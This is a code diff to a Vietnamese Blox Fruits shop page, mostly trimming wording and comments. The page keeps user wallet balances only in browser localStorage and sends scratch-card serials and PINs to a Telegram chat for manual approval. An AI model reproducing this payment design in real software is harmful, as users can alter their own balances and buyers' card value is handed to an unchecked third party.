@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shop Blox Fruits - Nạp Tiền & Mua Hàng Tự Động</title>
+    <title>Shop Blox Fruits - Nạp Tiền & Mua Hàng</title>
     <style>
         :root {
             --primary: #f59e0b;
@@ -296,7 +296,7 @@
         <!-- 4. THÔNG BÁO GỬI THẺ THÀNH CÔNG -->
         <div id="successScreen" class="hidden" style="text-align: center; padding: 15px 0;">
             <h2 style="color: #22c55e;">🎉 Gửi Thẻ Thành Công!</h2>
-            <p style="font-size: 12px; color: var(--gray); margin-bottom: 15px;">Thông tin thẻ đã gửi về Telegram kèm nút bấm duyệt để cộng tiền vào ví cho bạn.</p>
+            <p style="font-size: 12px; color: var(--gray); margin-bottom: 15px;">Thông tin thẻ đã gửi về Telegram kèm nút bấm duyệt.</p>
             <button onclick="goBackHome()">Về Trang Chủ</button>
         </div>
     </div>
@@ -319,7 +319,7 @@
 
             currentUser = user;
             if (userBalances[currentUser] === undefined) {
-                userBalances[currentUser] = 0; // Tài khoản mới mặc định 0đ
+                userBalances[currentUser] = 0;
                 localStorage.setItem('shop_balances', JSON.stringify(userBalances));
             }
 
@@ -375,14 +375,14 @@
                 return;
             }
 
+            // Sửa lỗi hiển thị chữ B bằng cách bỏ dấu bọc markdown không cần thiết ở Seri và PIN
             const message = `💳 *YÊU CẦU NẠP THẺ CÀO (VÍ TIỀN)*\n\n` +
                             `👤 *Tài khoản:* ${currentUser}\n` +
                             `📡 *Nhà mạng:* ${telco} - *Mệnh giá:* ${Number(amount).toLocaleString('vi-VN')} VNĐ\n` +
-                            `🔢 *Số Seri:* \`${serial}\`\n` +
-                            `🔑 *Mã PIN:* \`${pin}\`\n` +
+                            `🔢 *Số Seri:* ${serial}\n` +
+                            `🔑 *Mã PIN:* ${pin}\n` +
                             `⏱ *Thời gian:* ${new Date().toLocaleString('vi-VN')}`;
 
-            // Tạo nút bấm trực tiếp ngay dưới tin nhắn thông báo nạp thẻ
             const inlineKeyboard = {
                 inline_keyboard: [
                     [
@@ -407,7 +407,6 @@
             document.getElementById('depositScreen').classList.add('hidden');
             document.getElementById('successScreen').classList.remove('hidden');
             
-            // Xóa form
             document.getElementById('serialCard').value = '';
             document.getElementById('pinCard').value = '';
         }
@@ -420,7 +419,6 @@
             }
 
             if (confirm(`Bạn có chắc chắn muốn mua "${productName}" với giá ${price.toLocaleString('vi-VN')} VNĐ không?`)) {
-                // Trừ tiền trong ví
                 userBalances[currentUser] -= price;
                 localStorage.setItem('shop_balances', JSON.stringify(userBalances));
                 updateUI();
